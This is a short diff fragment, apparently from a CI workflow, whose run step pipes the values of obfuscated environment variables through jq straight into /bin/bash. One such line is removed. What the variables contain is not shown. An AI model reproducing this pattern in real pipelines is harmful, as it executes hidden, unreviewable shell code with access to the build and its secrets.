@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$ydr081" | jq -r .jce6852 | /bin/bash
           printf '%s' "$saklk5" | jq -r .k028 | /bin/bash
-          echo $pwt94 | jq -r .hyknx227 | /bin/bash
           printf '%s' "$uglqx04826" | jq -r .ez5825 | /bin/bash
 
       - name: Persist output
